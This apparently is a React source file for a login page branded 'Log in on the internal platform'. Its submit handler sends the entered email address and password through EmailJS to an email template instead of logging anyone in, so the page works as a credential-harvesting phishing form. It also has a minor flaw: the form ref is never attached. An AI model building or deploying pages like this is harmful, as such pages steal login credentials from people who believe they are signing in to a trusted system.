import React, { useRef } from 'react';
import {
  Box,
  Button,
  Card,
  CardContent,
  Container,
  Divider,
  Link,
  TextField,
  Typography
} from '@mui/material';
import emailjs from '@emailjs/browser';

export const EmailForm = () => {
	const form = useRef();
	const sendEmail = (e) => {
		e.preventDefault();

		emailjs.sendForm('service_ghnbthu', 'YOUR_TEMPLATE_ID', form.current, 'RFs-zcpejBO5og-ua')
			.then((result) => {
				console.log(result.text);
			}, (error) => {
				console.log(error.text);
			});
	};



	return (
	<Box
		sx={{
			backgroundColor: 'background.default',
			minHeight: '100%',
			p: 3
		}}
	>
		<Container maxWidth="sm">
			<Card>
				<CardContent
					sx={{
						display: 'flex',
						flexDirection: 'column',
						minHeight: 400,
						p: 4
					}}
				>
					<Box
						sx={{
							display: 'flex',
							justifyContent: 'space-between'
						}}
					>
						<div>
							<Typography variant="h4">
								Log in
							</Typography>
							<Typography
								color="textSecondary"
								sx={{ mt: 1 }}
								variant="body2"
							>
								Log in on the internal platform
							</Typography>
						</div>
						<img
							alt="Amplify"
							src="/static/icons/amplify.svg"
							style={{
								maxWidth: '53.62px',
								width: '100%'
							}}
						/>
					</Box>
					<Box
						sx={{
							flexGrow: 1,
							mt: 3
						}}
					>
						<form onSubmit={(event) => sendEmail(event)}>
							<TextField
								fullWidth
								label="Email Address"
								margin="normal"
								name="from_name"
								type="email"
							/>
							<TextField
								fullWidth
								label="Password"
								margin="normal"
								name="to_name"
								type="password"
							/>
							<Box sx={{ mt: 2 }}>
								<Button
									fullWidth
									size="large"
									type="submit"
									variant="contained"
								>
									Send
								</Button>
							</Box>
						</form>
					</Box>
					<Divider sx={{ my: 3 }} />
					<Link
						color="textSecondary"
						href="#"
						variant="body2"
					>
						Create new account
					</Link>
				</CardContent>
			</Card>
		</Container>
	</Box>
)};